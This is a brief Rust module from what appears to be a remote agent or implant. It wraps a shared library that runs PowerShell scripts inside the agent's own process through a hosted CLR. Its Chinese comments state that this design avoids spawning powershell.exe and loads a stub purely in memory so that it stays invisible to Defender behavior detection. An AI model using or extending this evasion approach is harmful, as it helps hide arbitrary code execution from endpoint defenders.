//! PowerShell inline execution entry.
//!
//! 默认执行方式（powershell-inline）：agent 进程内托管 CLR 4 + GAC 中的
//! System.Management.Automation，无 powershell.exe 进程、无内存补丁、
//! stub 纯内存加载，对 Defender 行为检测不可见。
//!
//! 实现位于共享库 `libra-psinline`（script 模块的 powershell() 也复用它）。

use libra_psinline;

pub struct PowerShellRunner;

impl PowerShellRunner {
    /// Execute PowerShell script in-process via the hosted CLR.
    pub fn execute(script: &str, timeout_secs: u64) -> String {
        libra_psinline::execute_inline(script, timeout_secs)
    }
}
